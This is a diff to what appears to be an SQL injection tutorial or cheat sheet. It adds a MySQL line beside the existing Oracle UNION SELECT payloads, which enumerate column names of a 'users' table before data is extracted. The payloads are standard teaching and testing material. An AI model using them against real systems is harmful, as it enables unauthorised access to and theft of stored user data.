@@ -174,6 +174,7 @@ Next we need to determine the column names. We do this by querying the *user_tab
 ```SQL
 ' UNION SELECT column_name, NULL, NULL, NULL FROM user_tab_columns WHERE table_name = 'USERS' --
 ' UNION SELECT column_name, NULL, NULL, NULL FROM user_tab_columns WHERE table_name = 'USERS' --
+' union select column_name,2 from information_schema.columns where table_name = 'users' -- #mysql
 ```
 
 Once we have the column and table names we can extract the desired data.
